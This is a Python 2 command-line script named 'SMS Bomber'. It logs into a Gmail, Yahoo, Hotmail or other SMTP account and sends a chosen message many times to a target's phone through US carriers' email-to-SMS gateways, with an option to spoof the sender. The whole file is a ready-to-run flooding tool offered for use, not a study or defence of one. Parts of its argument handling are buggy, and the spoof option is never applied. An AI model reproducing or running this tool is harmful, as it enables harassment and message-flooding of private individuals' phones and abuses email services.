#! /usr/bin/env python
import time, smtplib, sys, getpass

# need to define:
"""
e-prov (email-provider) [gmail]|[yahoo]|[custom]
from [attacker email]
from-spoof [spoof attacker email]
to [target email (syntax: [10-digit #]@mms|txt.[provider].com|net|org)]
c [count (# of txt's to send)]
t [time to wait in between texts]
"""
# parse some arguments

def usage(err=''):
	if err:
		print "\n [*] " + err
		pass
	print """
SMS Bomber ~ By Willy Fox - @BlackVikingPro

Check out my GitHub: https://github.com/BlackVikingPro
Check out my GitHub Gist: https://gist.github.com/BlackVikingPro

Usage:
	-ep [-e-prov] 		-- Email provider (gmail, yahoo, custom)
	-cc [-cell-carrier]	-- Target cell phone's carrier [att|cellone|verizon|etc]
	-f [--from] 		-- From email address (can be spoofed)
	-sp [--spoof-from] 	-- Spoof from address (recommended, optional)
	-d [--dest-addr] 	-- Destination address [10 digit phone number (example: 5551234567)]
							- (Country Code => (1) Area Code => (123) Phone # => (4567890))
							- (Command Line Format: 11234567890)
	-m [--message] 		-- Message to spam
	-c [--count] 		-- Number of messages to send

Example:
	python sms-bomber.py -ep gmail -cc att -f example@gmail.com -d 1123456789 -m "test" -c 5

Troubleshooting:
	* Gmail accounts require you to allow "Less Secure Apps" in order to login through RAW SMTP connections
		- (see https://support.google.com/a/answer/6260879)
	"""
	pass

try:
	if sys.argv[1] in ('', 'help', 'h', '-h', '-help', '--help', '/?', '?'):
		usage()
		sys.exit()
		pass
	pass
except IndexError:
	usage()
	sys.exit()

try:
	if ('-ep' or '-e-prov') in sys.argv:
		if '--e-prov' in sys.argv:
			e_prov_ = sys.argv.index('--e-prov')
			email_provider = sys.argv[(e_prov_ + 1)]
		elif '-ep' in sys.argv:
			e_prov_ = sys.argv.index('-ep')
			email_provider = sys.argv[(e_prov_ + 1)]
		else:
			usage("Define email provider.")
			sys.exit()
			pass
		pass

	if ('-cc' or '--cell-carrier') in sys.argv:
		if '-cc' in sys.argv:
			_cc = sys.argv.index('-cc')
			cell_carrier = sys.argv[(_cc + 1)]
		elif '--cell-carrier' in sys.argv:
			_cc = sys.argv.index('--cell-carrier')
		else:
			usage("Define target's cell carrier.")
			sys.exit()
			pass
		pass

	if ('-f' or '--from') in sys.argv:
		if '-f' in sys.argv:
			f_co_ = sys.argv.index('-f')
			from_addr = sys.argv[(f_co_ + 1)]
		elif '--from' in sys.argv:
			f_co_ = sys.argv.index('--from')
			from_addr = sys.argv[(f_co_ + 1)]
		else:
			usage("Define from email.")
			sys.exit()
			pass
		pass

	if ('-sp' or '--spoof-from') in sys.argv:
		if '-sp' in sys.argv:
			_sp_ = sys.argv.index('-sp')
			from_addr_spoof = sys.argv[(_sp_ + 1)]
			spoof = True
		elif '--spoof-from' in sys.argv:
			_sp_ = sys.argv.index('--spoof-from')
			from_addr_spoof = sys.argv[(_sp_ + 1)]
			spoof = True
		else:
			spoof = False
			pass

	if ('-d' or '--dest-addr') in sys.argv:
		if '-d' in sys.argv:
			_to_ = sys.argv.index('-d')
			dest_addr = sys.argv[(_to_ + 1)]
		elif '--dest-addr' in sys.argv:
			_to_ = sys.argv.index('--dest-addr')
			dest_addr = sys.argv[(_to_ + 1)]
		else:
			usage("Define destination email.")
			sys.exit()
			pass

	if ('-m' or '--message'):
		if '-m' in sys.argv:
			_mess = sys.argv.index('-m')
			message = sys.argv[(_mess + 1)]
		elif '--message' in sys.argv:
			_mess = sys.argv.index('--message')
			message = sys.argv[(_mess + 1)]
		else:
			usage("Define message.")
			sys.exit()
			pass
		pass

	if ('-c' or '--count'):
		if '-c' in sys.argv:
			_c = sys.argv.index('-c')
			count = int(sys.argv[(_c + 1)])
		elif '--count' in sys.argv:
			_c = sys.argv.index('--count')
			count = int(sys.argv[(_c + 1)])
		else:
			usage("Define number of messages to send.")
			sys.exit()
		pass

	pass
except IndexError:
	usage()
	sys.exit()
except ValueError:
	usage()
	sys.exit()
	pass

"""
def mail(to, subject, text, attach, prioflag1, prioflag2):
    msg = MIMEMultipart()
    msg['From'] = str(
        Header(from_displayname, 'UTF-8').encode() + ' <' + from_address + '> ')
    msg['To'] = to
    msg['X-Priority'] = prioflag1
    msg['X-MSMail-Priority'] = prioflag2
    msg['Subject'] = Header(subject, 'UTF-8').encode()
"""

def sendmail(to, _from, email_provider, msg, count, carrier):
	supported_carriers = [
							'att', '@txt.att.net',
							'cellone', '@sms.cellonenation.net',
							'verizon', '@vtext.com',
							'alltel', '@message.alltel.com',
							'boost', '@myboostmobile.com',
							'cricket', '@sms.mycricket.com',
							'metropcs', '@mymetropcs.com',
							'sprint', '@messaging.sprintpcs.com',
							'nextel', '@page.nextel.com',
							'straighttalk', '@vtext.com',
							'tmobile', '@tmomail.net',
							'uscellular', '@email.uscc.net',
							'virgin', '@vmobl.com',
							]
	
	if carrier in supported_carriers:
		carrier_email = supported_carriers[(supported_carriers.index(carrier) + 1)]
	else:
		usage("Carrier not supported. Below carriers are supported.")
		x = 0
		sys.stdout.write("Supported: ")
		while x < len(supported_carriers):
			sys.stdout.write(supported_carriers[x] + ", ")
			x = x + 2
			pass
		print ""
		sys.exit()
		pass

	supported_email_providers = [
								'gmail', 'smtp.gmail.com',
								'yahoo', 'smtp.mail.yahoo.com',
								'cockli', 'mail.cock.li',
								'hotmail', 'smtp.live.com',
									]
	if email_provider in supported_email_providers:
		_email_provider = supported_email_providers[(supported_email_providers.index(email_provider) + 1)]
	else:
		usage("Email provider not supported. Below providers are supported.")
		x = 0
		sys.stdout.write("Supported: ")
		while x < len(supported_email_providers):
			sys.stdout.write(supported_email_providers[x] + ", ")
			x = x + 2
			pass
		print ""
		sys.exit()
		pass

	email_port = 587
	password = getpass.getpass("Email Password: ")
	print ""
	target_email = to + carrier_email

	server = smtplib.SMTP(_email_provider, email_port) # open connection
	server.starttls() # start tls connection
	try:
		server.login(_from, password) # login
	except smtplib.SMTPAuthenticationError: 
		print " [*] Login failed.\n"
		sys.exit()

	# start the loop
	try:
		x = 0
		for _ in range(0, count):
			server.sendmail(_from, target_email, message)

			nums = []
			nums.append(x + 1)
			_range = ['_']

			for x in nums:
				sys.stdout.write( "\r [*] Successfully sent %s/%s " % (x, count) )
				sys.stdout.flush()
				pass
			pass
	except KeyboardInterrupt:
		print "\n\nExiting cleanly..."
		server.quit()
		sys.exit()
		pass
	except Exception as e:
		print "Something went wrong!"
		print e

	print "\n\n%s texts were sent successfully!" % count
	server.quit()
	pass

if __name__ == '__main__':
	sendmail(dest_addr, from_addr,email_provider, message, count, cell_carrier)
	pass
